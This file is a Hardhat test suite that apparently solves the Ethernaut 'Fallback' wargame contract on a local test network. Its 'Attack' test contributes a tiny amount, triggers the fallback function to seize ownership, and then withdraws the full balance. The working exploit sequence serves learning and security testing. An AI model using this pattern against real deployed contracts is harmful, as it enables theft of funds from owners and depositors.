import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import { parseEther } from "ethers/lib/utils";

const contractName = "Fallback";

async function deployFixture() {
  const [deployer, attacker] = await ethers.getSigners();
  const { provider } = ethers;

  await deployer.sendTransaction({
    value: parseEther("10"),
    to: attacker.address,
  });

  const Contract = await ethers.getContractFactory(contractName);
  const contract = await Contract.deploy();

  return { contract, deployer, attacker, provider };
}

describe(contractName, function () {
  describe("Deploy", function () {
    it("contract owner should be deployer", async function () {
      const { contract, deployer } = await loadFixture(deployFixture);
      const owner = await contract.owner();
      expect(owner).to.be.eql(deployer.address);
    });
    it("contract balance should be 0", async function () {
      const { contract, provider } = await loadFixture(deployFixture);
      const contractBalance = await provider.getBalance(contract.address);
      expect(contractBalance.toString()).to.be.eql("0");
    });
  });

  describe("Attack", function () {
    it("should claim ownership and reduce balance to 0", async function () {
      const { contract, provider, attacker, deployer } = await loadFixture(
        deployFixture
      );
      // contribute to Fallback by calling contribute
      const attackerContribution = parseEther("0.0005");
      const contributeData = await contract.populateTransaction.contribute();
      await attacker.sendTransaction({
        to: contract.address,
        value: attackerContribution,
        data: contributeData.data,
      });
      // trigger fallback
      await attacker.sendTransaction({
        to: contract.address,
        value: attackerContribution,
      });
      // check contract balance
      let contractBalance = await provider.getBalance(contract.address);
      expect(contractBalance).to.be.eql(attackerContribution.mul(2));
      // check attacker as owner
      const owner = await contract.owner();
      expect(owner).to.be.eql(attacker.address);
      // withdraw balance
      const withdrawData = await contract.populateTransaction.withdraw();
      await attacker.sendTransaction({
        to: contract.address,
        data: withdrawData.data,
      });
      // check contract balance is 0
      contractBalance = await provider.getBalance(contract.address);
      expect(contractBalance.toString()).to.be.eql("0");
    });
  });
});
